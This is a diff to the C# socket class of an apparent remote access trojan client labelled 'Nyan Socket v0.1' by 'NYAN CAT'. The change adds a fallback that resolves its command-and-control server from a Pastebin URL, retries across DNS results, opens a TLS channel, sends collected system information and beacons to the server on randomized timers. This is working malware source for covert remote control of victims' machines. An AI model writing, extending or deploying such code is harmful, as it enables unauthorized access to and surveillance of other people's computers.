@@ -1,19 +1,15 @@
 ﻿using Client.Handle_Packet;
 using Client.Helper;
 using Client.MessagePack;
-using Microsoft.VisualBasic.Devices;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
 using System.Threading;
-using System.Text;
-using System.Security.Principal;
 using System.Net.Security;
 using System.Security.Authentication;
 using System.Security.Cryptography.X509Certificates;
 using System.Net;
-using System.Text.RegularExpressions;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Nyan Socket v0.1
@@ -38,46 +34,68 @@ namespace Client.Sockets
         {
             try
             {
+
                 Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
                 };
+
                 if (Settings.Pastebin == "null")
                 {
-                    Regex r = new Regex("^[a-zA-Z0-9]*$");
                     string ServerIP = Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]);
-                    Int16 ServerPort = Convert.ToInt16(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]);
+                    int ServerPort = Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]);
 
-
-                    if (r.IsMatch(ServerIP)) //check if the address is alphanumric (meaning its a domain)
+                    if (IsValidDomainName(ServerIP)) //check if the address is alphanumric (meaning its a domain)
                     {
                         IPAddress[] addresslist = Dns.GetHostAddresses(ServerIP); //get all IP's connected to that domain
 
                         foreach (IPAddress theaddress in addresslist) //we do a foreach becasue a domain can lead to multiple IP's
                         {
-                            Client.Connect(theaddress, ServerPort); //lets try and connect!
+                            try
+                            {
+                                Client.Connect(theaddress, ServerPort); //lets try and connect!
+                                if (Client.Connected) break;
+                            }
+                            catch { }
                         }
                     }
                     else
                     {
                         Client.Connect(ServerIP, ServerPort); //legacy mode connect (no DNS)
                     }
-                    
-
-                    //Client.Connect(Convert.ToString(Settings.Hosts.Split(',')[new Random().Next(Settings.Hosts.Split(',').Length)]),
-                    // Convert.ToInt16(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
+                }
+                else
+                {
+                    using (WebClient wc = new WebClient())
+                    {
+                        NetworkCredential networkCredential = new NetworkCredential("", "");
+                        wc.Credentials = networkCredential;
+                        string resp = wc.DownloadString(Settings.Pastebin);
+                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
+                        Settings.Hosts = spl[0];
+                        Settings.Ports = spl[new Random().Next(1, spl.Length)];
+                        Client.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
+                    }
                 }
 
-                Debug.WriteLine("Connected!");
-                IsConnected = true;
-                SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
-                SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
-                Buffer = new byte[4];
-                MS = new MemoryStream();
-                Send(Methods.SendInfo());
-                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
-                SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                if (Client.Connected)
+                {
+                    Debug.WriteLine("Connected!");
+                    IsConnected = true;
+                    SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
+                    SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                    Buffer = new byte[4];
+                    MS = new MemoryStream();
+                    Send(Methods.SendInfo());
+                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
+                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                }
+                else
+                {
+                    IsConnected = false;
+                    return;
+                }
             }
             catch
             {
@@ -85,6 +103,11 @@ namespace Client.Sockets
                 IsConnected = false;
                 return;
             }
+        }
+
+        private static bool IsValidDomainName(string name)
+        {
+            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
         }
 
         private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
